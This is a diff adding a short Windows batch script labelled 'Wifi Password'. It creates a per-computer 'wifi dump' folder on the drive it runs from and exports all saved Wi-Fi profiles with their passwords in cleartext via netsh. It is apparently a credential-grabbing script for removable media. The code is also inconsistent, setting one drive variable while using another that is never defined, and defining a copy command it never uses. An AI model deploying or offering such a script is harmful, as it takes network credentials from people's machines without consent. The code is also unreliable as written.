@@ -1,0 +1,16 @@
+@echo off 
+:: variables 
+SET odrive=%odrive:~0,2% 
+set backupcmd=xcopy /s /c /d /h /i /r /y /q
+echo off 
+%~d0
+cd %~dp0
+echo.
+echo Wifi Password
+mkdir "%drive%\all\%computername%\wifi dump"
+cd "%drive%\all\%computername%\wifi dump"
+dir
+netsh wlan export profile key=clear
+
+pause
+@echo off 
